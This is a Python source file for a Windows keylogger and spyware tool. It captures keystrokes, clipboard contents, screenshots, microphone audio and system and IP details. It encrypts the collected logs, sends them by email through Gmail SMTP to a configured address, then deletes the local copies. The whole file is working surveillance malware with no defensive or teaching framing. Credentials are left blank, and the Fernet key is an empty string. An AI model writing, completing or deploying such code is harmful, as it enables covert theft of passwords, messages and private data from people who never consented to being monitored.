import os
import time
import socket
import platform
import win32clipboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Key, Listener
import sounddevice as sd
from scipy.io.wavfile import write
from cryptography.fernet import Fernet
import getpass
from requests import get
from PIL import ImageGrab

# File and Email Configuration
file_path = "E:\\Python Projects\\Key Logger"
extend = "\\"
keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"
keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"
key = ""
email_address = ""
password = ""
toaddr = ""
microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3
username = getpass.getuser()

def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))

    try:
        with open(attachment, 'rb') as file:
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(file.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f"attachment; filename= {filename}")
            msg.attach(p)
    except FileNotFoundError:
        print(f"Error: The file {attachment} was not found.")
        return

    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as s:
            s.starttls()
            s.login(fromaddr, password)
            s.sendmail(fromaddr, toaddr, msg.as_string())
    except Exception as e:
        print(f"Error sending email: {e}")

def computer_information():
    try:
        with open(os.path.join(file_path, system_information), "a") as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            try:
                public_ip = get("https://api.ipify.org").text
                f.write(f"Public IP Address: {public_ip}\n")
            except Exception:
                f.write("Couldn't get Public IP Address (most likely max query)\n")
            f.write(f"Processor: {platform.processor()}\n")
            f.write(f"System: {platform.system()} {platform.version()}\n")
            f.write(f"Machine: {platform.machine()}\n")
            f.write(f"Hostname: {hostname}\n")
            f.write(f"Private IP Address: {IPAddr}\n")
        print(f"System information saved to {system_information}.")
    except Exception as e:
        print(f"Error writing system information: {e}")

def copy_clipboard():
    try:
        with open(os.path.join(file_path, clipboard_information), "a") as f:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write(f"Clipboard Data: \n{pasted_data}\n")
        print(f"Clipboard information saved to {clipboard_information}.")
    except Exception as e:
        print(f"Clipboard could not be copied: {e}")

def microphone():
    try:
        fs = 44100
        seconds = microphone_time
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        write(os.path.join(file_path, audio_information), fs, myrecording)
        print(f"Audio recording saved to {audio_information}.")
    except Exception as e:
        print(f"Error recording audio: {e}")

def screenshot():
    try:
        im = ImageGrab.grab()
        im.save(os.path.join(file_path, screenshot_information))
        print(f"Screenshot saved to {screenshot_information}.")
    except Exception as e:
        print(f"Error taking screenshot: {e}")

def on_press(key):
    global keys, count, currentTime
    try:
        k = str(key).replace("'", "")
        if k == "Key.space":
            keys.append(' ')
        elif k.find("Key") == -1:
            keys.append(k)
        count += 1
        currentTime = time.time()
    except Exception as e:
        print(f"Error in on_press: {e}")

def write_file(keys):
    try:
        with open(os.path.join(file_path, keys_information), "a") as f:
            for key in keys:
                f.write(key)
        print(f"Keystrokes saved to {keys_information}.")
    except Exception as e:
        print(f"Error writing to file: {e}")

def on_release(key):
    if key == Key.esc:
        return False
    if currentTime > stoppingTime:
        return False

keys = []
count = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration
number_of_iterations = 0

while number_of_iterations < number_of_iterations_end:
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    if currentTime > stoppingTime:
        with open(os.path.join(file_path, keys_information), "w") as f:
            f.write(" ")
        screenshot()
        send_email(screenshot_information, os.path.join(file_path, screenshot_information), toaddr)
        copy_clipboard()
        write_file(keys)  # Write remaining keystrokes to file
        number_of_iterations += 1
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

files_to_encrypt = [os.path.join(file_path, system_information), os.path.join(file_path, clipboard_information), os.path.join(file_path, keys_information)]
encrypted_file_names = [os.path.join(file_path, system_information_e), os.path.join(file_path, clipboard_information_e), os.path.join(file_path, keys_information_e)]

for src, dest in zip(files_to_encrypt, encrypted_file_names):
    try:
        with open(src, 'rb') as f:
            data = f.read()
        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)
        with open(dest, 'wb') as f:
            f.write(encrypted)
        send_email(os.path.basename(dest), dest, toaddr)
    except FileNotFoundError:
        print(f"Error: The file {src} was not found.")

time.sleep(120)

delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    try:
        os.remove(os.path.join(file_path, file))
        print(f"Deleted file {file}.")
    except FileNotFoundError:
        print(f"Error: The file {os.path.join(file_path, file)} was not found.")
